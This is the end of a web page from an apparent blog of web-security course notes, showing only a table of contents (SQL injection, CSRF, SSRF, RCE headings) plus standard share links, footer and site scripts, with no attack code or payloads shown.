href="#impact-2"><span class="toc-number">1.4.0.5.0.1.</span> <span class="toc-text">Impact</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#subdomain-takeovers"><span class="toc-number">1.4.0.6.</span> <span class="toc-text">Subdomain Takeovers</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli"><span class="toc-number">1.5.</span> <span class="toc-text">SQLi</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E4%B8%A4%E7%A7%8Dcomment"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">SQLä¸¤ç§Comment</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-injection-union-attacks"><span class="toc-number">1.5.0.2.</span> <span class="toc-text">SQL
injection UNION attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#get-database-version"><span class="toc-number">1.5.0.2.0.1.</span> <span class="toc-text">Get Database Version</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#get-schema-name"><span class="toc-number">1.5.0.2.0.2.</span> <span class="toc-text">GET Schema Name</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#get-table-name"><span class="toc-number">1.5.0.2.0.3.</span> <span class="toc-text">Get Table Name</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#get-string-value"><span class="toc-number">1.5.0.2.0.4.</span> <span class="toc-text">Get String Value</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#retrieve-multiple-values-in-a-single-column"><span class="toc-number">1.5.0.2.0.5.</span> <span class="toc-text">Retrieve Multiple
Values in a Single Column</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#authentication-bypass-with-limit"><span class="toc-number">1.5.0.3.</span> <span class="toc-text">Authentication Bypass with
LIMIT</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-4"><span class="toc-number">1.5.0.3.0.1.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#mitigation"><span class="toc-number">1.5.0.3.0.2.</span> <span class="toc-text">Mitigation</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-wildcard-attack"><span class="toc-number">1.5.0.4.</span> <span class="toc-text">SQL Wildcard Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-5"><span class="toc-number">1.5.0.4.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cross-site-request-forgery-%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-csrf"><span class="toc-number">1.6.</span> <span class="toc-text">Cross-Site
Request Forgery è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€  (CSRF)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#mitigation-1"><span class="toc-number">1.6.0.0.0.1.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-6"><span class="toc-number">1.6.0.0.0.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#server-side-request-forgery-ssrf-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-number">1.7.</span> <span class="toc-text">Server-Side
Request Forgery (SSRF) æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#data-exfiltration-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-number">1.7.0.1.</span> <span class="toc-text">Data Exfiltration æ•°æ®æ³„éœ²</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-2"><span class="toc-number">1.7.0.1.0.1.</span> <span class="toc-text">å®šä¹‰</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E6%B3%84%E6%BC%8F%E7%9A%84dynamic-url-parameter%E5%8F%91%E8%B5%B7%E4%BC%AA%E9%80%A0%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82"><span class="toc-number">1.7.0.2.</span> <span class="toc-text">æ ¹æ®æ³„æ¼çš„Dynamic
URL &amp; Parameterå‘èµ·ä¼ªé€ æœåŠ¡ç«¯è¯·æ±‚</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-7"><span class="toc-number">1.7.0.2.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#remote-code-execution-rce-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">1.7.0.3.</span> <span class="toc-text">Remote Code
Execution (RCE) è¿œç¨‹æ‰§è¡Œä»£ç </span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#authorisation-vs-authentication"><span class="toc-number">1.8.</span> <span class="toc-text">Authorisation vs
Authentication</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#serialisation-vs-deserialisation"><span class="toc-number">1.9.</span> <span class="toc-text">Serialisation vs
Deserialisation</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yumtaro.com/archives/0.html/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yumtaro.com/archives/0.html/&text=COMP90074 ç½‘ç»œå®‰å…¨"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yumtaro.com/archives/0.html/&title=COMP90074 ç½‘ç»œå®‰å…¨"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yumtaro.com/archives/0.html/&is_video=false&description=COMP90074 ç½‘ç»œå®‰å…¨"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=COMP90074 ç½‘ç»œå®‰å…¨&body=Check out this article: https://yumtaro.com/archives/0.html/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yumtaro.com/archives/0.html/&title=COMP90074 ç½‘ç»œå®‰å…¨"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yumtaro.com/archives/0.html/&title=COMP90074 ç½‘ç»œå®‰å…¨"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yumtaro.com/archives/0.html/&title=COMP90074 ç½‘ç»œå®‰å…¨"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yumtaro.com/archives/0.html/&title=COMP90074 ç½‘ç»œå®‰å…¨"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yumtaro.com/archives/0.html/&name=COMP90074 ç½‘ç»œå®‰å…¨&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yumtaro.com/archives/0.html/&t=COMP90074 ç½‘ç»œå®‰å…¨"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div>
    
      <script src='https://unpkg.com/mermaid@8.5/dist/mermaid.min.js'></script>
      <script>
        if (window.mermaid) {
          mermaid.initialize({
            theme: 'default',
            "flowchart": {
              curve: 'basis'
          }
          });
        }
      </script>
    
  </div>
  <div class="footer-left">
    Copyright &copy;
    
    
    2020-2022
    Darren Z
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/search/">ğŸ”</a></li>
        
      </ul>
    </nav>
  </div>
</footer>
    </div>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->



    <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
    <script>AV.initialize("tPqQzJulKGGdtnC1z2YQUn1W-gzGzoHsz", "F7c8R6ipy1FgLulcivI5BU0e");</script>
    <script>
      function showTime(Counter) {
        var query = new AV.Query(Counter);
        var entries = [];
        var $visitors = $(".leancloud_visitors");
  
        $visitors.each(function () {
          entries.push( $(this).attr("id").trim() );
        });
  
        query.containedIn('url', entries);
        query.find()
          .done(function (results) {
            var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
  
            if (results.length === 0) {
              $visitors.find(COUNT_CONTAINER_REF).text(0);
              return;
            }
  
            for (var i = 0; i < results.length; i++) {
              var item = results[i];
              var url = item.get('url');
              var time = item.get('time');
              var element = document.getElementById(url);
  
              $(element).find(COUNT_CONTAINER_REF).text(time);
            }
            for(var i = 0; i < entries.length; i++) {
              var url = entries[i];
              var element = document.getElementById(url);
              var countSpan = $(element).find(COUNT_CONTAINER_REF);
              if( countSpan.text() == '') {
                countSpan.text(0);
              }
            }
          })
          .fail(function (object, error) {
            console.log("Error: " + error.code + " " + error.message);
          });
      }
  
      function addCount(Counter) {
        var $visitors = $(".leancloud_visitors");
        var url = $visitors.attr('id').trim();
        var title = $visitors.attr('data-flag-title').trim();
        var query = new AV.Query(Counter);
  
        query.equalTo("url", url);
        query.find({
          success: function(results) {
            if (results.length > 0) {
              var counter = results[0];
              counter.fetchWhenSave(true);
              counter.increment("time");
              counter.save(null, {
                success: function(counter) {
                  var $element = $(document.getElementById(url));
                  $element.find('.leancloud-visitors-count').text(counter.get('time'));
                },
                error: function(counter, error) {
                  console.log('Failed to save Visitor num, with error message: ' + error.message);
                }
              });
            } else {
              var newcounter = new Counter();
              /* Set ACL */
              var acl = new AV.ACL();
              acl.setPublicReadAccess(true);
              acl.setPublicWriteAccess(true);
              newcounter.setACL(acl);
              /* End Set ACL */
              newcounter.set("title", title);
              newcounter.set("url", url);
              newcounter.set("time", 1);
              newcounter.save(null, {
                success: function(newcounter) {
                  var $element = $(document.getElementById(url));
                  $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
                },
                error: function(newcounter, error) {
                  console.log('Failed to create');
                }
              });
            }
          },
          error: function(error) {
            console.log('Error:' + error.code + " " + error.message);
          }
        });
      }
  
      $(function() {
        var Counter = AV.Object.extend("Counter");
        if ($('.leancloud_visitors').length == 1) {
          addCount(Counter);
        } else if ($('.post-title-link').length > 1) {
          showTime(Counter);
        }
      });
    </script>
  

